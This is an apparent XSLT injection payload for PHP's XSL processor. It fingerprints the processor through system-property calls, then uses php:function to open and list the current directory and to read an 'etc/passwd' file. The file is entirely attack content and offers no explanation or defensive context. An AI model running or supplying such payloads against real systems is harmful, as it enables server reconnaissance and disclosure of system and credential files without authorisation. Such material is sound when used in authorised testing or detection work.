<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;color:red;background-color:#000000">
        <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <p>
    	Version: <xsl:value-of select="system-property('xsl:version')" />
        <br/>
    	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
        <br/>
    	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
        <br/>
        Dir: <xsl:value-of name="assert" select="php:function('opendir', '.')"/>
        <br/>
        Files: 
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('readdir')"/>
        <br/>
        <xsl:value-of select="php:function('file_get_contents','etc/passwd')" />
        <br/>

        
    

        
        
    </p>
</body>
</html> 
